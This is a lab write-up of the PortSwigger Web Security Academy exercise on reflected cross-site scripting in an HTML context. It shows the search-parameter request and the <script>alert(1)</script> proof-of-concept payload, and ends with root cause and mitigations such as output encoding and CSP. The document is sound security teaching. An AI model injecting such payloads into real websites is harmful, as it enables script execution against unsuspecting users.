# PortSwigger Lab Write-up – Reflected XSS into HTML Context

## 🧪 Lab

**Reflected XSS into HTML context with nothing encoded**

Platform: PortSwigger Web Security Academy

---

## 🧠 Vulnerability

**Reflected Cross-Site Scripting (XSS)**

The application reflects user input from the search parameter directly into the HTML response without encoding or sanitization.
Because the input is placed directly inside the HTML page, an attacker can inject JavaScript that executes in the victim's browser.

Example request:

```
GET /?search=test HTTP/2
Host: lab-id.web-security-academy.net
```

The search value is reflected in the page response.

---

## 🎯 Goal

Inject a JavaScript payload that executes in the victim's browser.

---

## 🔍 Exploitation

The following payload was inserted into the search field:

```
<script>alert(1)</script>
```

Burp request:

```
GET /?search=<script>alert(1)</script> HTTP/2
Host: lab-id.web-security-academy.net
```

---

## 📊 Result

The payload is reflected directly in the HTML response and executed by the browser.

This triggers a JavaScript alert:

```
alert(1)
```

This confirms the presence of **Reflected XSS**.

---

## 🛡 Root Cause

* User input is directly reflected in HTML
* No output encoding
* No input sanitization

---

## 🔒 Mitigation

### Output Encoding

Encode user input before rendering it in HTML.

Example:

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

### Use Security Libraries

Use frameworks that automatically escape user input.

### Content Security Policy (CSP)

Implement CSP headers to restrict execution of injected scripts.

---

## 🧰 Tools Used

* Burp Suite
* Firefox
* PortSwigger Web Security Academy

---

⚠️ Disclaimer

This write-up is for educational purposes only.
All testing was performed on intentionally vulnerable applications provided by PortSwigger Web Security Academy.
